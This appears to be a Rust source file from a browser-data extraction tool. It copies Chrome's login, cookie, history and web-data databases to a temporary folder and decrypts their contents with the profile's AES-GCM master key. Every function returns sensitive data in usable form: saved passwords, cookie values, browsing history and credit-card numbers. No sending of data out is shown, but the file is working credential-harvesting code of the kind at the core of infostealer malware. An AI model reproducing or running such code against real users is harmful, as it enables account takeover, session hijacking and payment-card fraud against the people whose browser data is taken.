use std::collections::HashMap;
use std::{fs, io};
use std::path::{Path, PathBuf};
use rusqlite::Connection;
use tempfile::TempDir;
use crate::chrome::item::{ChromeCookie, ChromeCreditCard, ChromeHistory, ChromeItem, ChromeLogin};
use crate::decrypt::aes_gcm_256;

#[derive(Clone)]
pub struct ChromeUser {
    pub tmp_dir: PathBuf,
    pub master_key: Vec<u8>,
    items: HashMap<PathBuf, ChromeItem>,
}
impl ChromeUser {
    pub fn new(master_key: Vec<u8>) -> io::Result<ChromeUser> {
        let cp = ChromeUser {
            tmp_dir: TempDir::new()?.into_path(),
            master_key,
            items: HashMap::new(),
        };

        Ok(cp)
    }

    pub fn add_item(&mut self, item: ChromeItem, file_path: impl AsRef<Path>) {
        let dest = self.tmp_dir.join(ChromeItem::temp_name(&item));
        self.items.insert(dest.clone(), item.clone());

        // TODO: this fails while copying cookies
        match fs::copy(file_path.as_ref().clone(), dest) {
            Ok(_) => {}
            Err(_) => {}
        }

        //fs::copy(file_path.as_ref().clone(), dest).expect(&*format!("Error while adding item: {:?}", file_path.as_ref()));
    }

    pub fn get_items(&self) -> Vec<ChromeItem> {
        self.items.clone().into_values().collect()
    }

    pub fn get_logins(&self) -> Result<Vec<ChromeLogin>, String> {
        let mut output = Vec::new();
        let path = self.tmp_dir.join(ChromeItem::temp_name(&ChromeItem::LoginData));
        let conn = Connection::open(path.as_path()).map_err(|e| {
            e.to_string()
        })?;

        let mut stmt = match conn.prepare(
            "SELECT origin_url, username_value, password_value, date_created FROM logins"
        ) {
            Ok(s) => s,
            Err(e) => {
                return Err(e.to_string());
            }
        };

        let login_iter = stmt.query_map([], |row| {
            let pwd_buf: Vec<u8> = row.get(2)?;
            let decoded_pwd = aes_gcm_256(self.master_key.clone().as_mut_slice(), pwd_buf).unwrap();

            Ok(ChromeLogin {
                origin_url: row.get(0)?,
                username_value: row.get(1)?,
                password_value: decoded_pwd,
                date_created: row.get(3)?,
            })
        }).map_err(|e| e.to_string())?;

        for login in login_iter {
            match login {
                Ok(l) => output.push(l),
                Err(_) => {
                    continue
                }
            }
        };

        Ok(output)
    }

    pub fn get_cookies(&self) -> Result<Vec<ChromeCookie>, String> {
        let mut output = Vec::new();

        let path = self.tmp_dir.join(ChromeItem::temp_name(&ChromeItem::Cookies));
        let conn = Connection::open(path.as_path()).map_err(|e| {
            e.to_string()
        })?;

        let mut stmt = match conn.prepare(
            "SELECT name, encrypted_value, host_key, path, creation_utc, expires_utc, is_secure, is_httponly, has_expires, is_persistent FROM cookies"
        ) {
            Ok(s) => s,
            Err(e) => {
                return Err(e.to_string());
            }
        };

        let cookie_iter = stmt.query_map([], |row| {
            let cookie_buf: Vec<u8> = row.get(1)?;
            let decoded_cookie = aes_gcm_256(self.master_key.clone().as_mut_slice(), cookie_buf).unwrap();

            Ok(ChromeCookie {
                name: row.get(0)?,
                value: decoded_cookie,
                host_key: row.get(2)?,
                path: row.get(3)?,
                creation_utc: row.get(4)?,
                expires_utc: row.get(5)?,
                is_secure: row.get(6)?,
                is_httponly: row.get(7)?,
                has_expires: row.get(8)?,
                is_persistent: row.get(9)?,
            })
        }).map_err(|e| e.to_string())?;

        for cookie in cookie_iter {
            match cookie {
                Ok(c) => output.push(c),
                Err(_) => {
                    continue
                }
            }
        };

        Ok(output)
    }

    pub fn get_history(&self) -> Result<Vec<ChromeHistory>, String>{
        let mut output: Vec<ChromeHistory> = Vec::new();

        let path = self.tmp_dir.join(ChromeItem::temp_name(&ChromeItem::History));
        let conn = Connection::open(path.as_path()).map_err(|e| {
            e.to_string()
        })?;


        let mut stmt = match conn.prepare(
                "SELECT url, title, visit_count, last_visit_time FROM urls"
        ) {
            Ok(s) => s,
            Err(e) => {
                return Err(e.to_string());
            }
        };

        let history_iter = stmt.query_map([], |row| {
            Ok(ChromeHistory {
                url: row.get(0)?,
                title: row.get(1)?,
                visit_count: row.get(2)?,
                last_visit_time: row.get(3)?,
            })
        }).map_err(|e| e.to_string())?;

        for history in history_iter {
            match history {
                Ok(c) => output.push(c),
                Err(_) => {
                    continue
                }
            }
        };

        Ok(output)
    }

    pub fn get_credit_cards(&self) -> Result<Vec<ChromeCreditCard>, String> {
        let mut output: Vec<ChromeCreditCard> = Vec::new();

        let path = self.tmp_dir.join(ChromeItem::temp_name(&ChromeItem::WebData));
        let conn = Connection::open(path.as_path()).map_err(|e| {
            e.to_string()
        })?;

        let mut stmt = match conn.prepare(
                "SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted, billing_address_id, nickname FROM credit_cards"
        ) {
            Ok(s) => s,
            Err(e) => {
                return Err(e.to_string());
            }
        };

        let credit_card_iter = stmt.query_map([], |row| {
            let credit_card_buf: Vec<u8> = row.get(4)?;
            let decoded_credit_card = aes_gcm_256(self.master_key.clone().as_mut_slice(), credit_card_buf).unwrap();
            Ok(ChromeCreditCard{
                guid: row.get(0)?,
                name_on_card: row.get(1)?,
                expiration_month: row.get(2)?,
                expiration_year: row.get(3)?,
                card_number: decoded_credit_card,
                billing_address_id: row.get(5)?,
                nickname: row.get(6)?,
            })
        }).map_err(|e| e.to_string())?;

        for credit_card in credit_card_iter {
            match credit_card {
                Ok(cc) => output.push(cc),
                Err(e) => {
                    continue
                }
            }
        };

        Ok(output)
    }
}
